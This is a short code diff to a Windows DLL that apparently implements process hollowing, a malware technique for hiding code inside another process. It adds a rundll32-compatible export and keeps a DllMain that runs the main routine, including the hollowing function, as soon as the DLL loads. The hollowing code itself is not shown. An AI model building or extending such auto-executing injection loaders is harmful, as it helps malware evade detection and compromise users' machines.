@@ -9,6 +9,17 @@
 #pragma comment(lib, "Advapi32.lib")
 
 FILE * debug_file_handle = stdout;
+
+extern "C" __declspec (dllexport) void __cdecl RegisterDll (
+   HWND hwnd,        // handle to owner window
+   HINSTANCE hinst,  // instance handle for the DLL
+   LPTSTR lpCmdLine, // string the DLL will parse
+   int nCmdShow      // show state
+){
+  //::MessageBox(0,lpCmdLine,0,0);
+}
+
+
 /*
  * Current DLL hmodule.
  */
@@ -449,7 +460,7 @@ void CreateHollowedProcess( const char* pDestCmdLine )
 
 }
 
-int _tmain(int argc, _TCHAR* argv[])
+int main(int argc, char* argv[])
 {
 
 #ifdef _DBG
@@ -499,8 +510,8 @@ BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
 	switch( dwReason ) 
     { 
 		case DLL_PROCESS_ATTACH:
-		   dll_handle = (HMODULE)hinstDLL;
-          _tmain(0, nullptr);
+		  dll_handle = (HMODULE)hinstDLL;
+          main(0, nullptr);
 		case DLL_PROCESS_DETACH:
 		case DLL_THREAD_ATTACH:
 		case DLL_THREAD_DETACH:
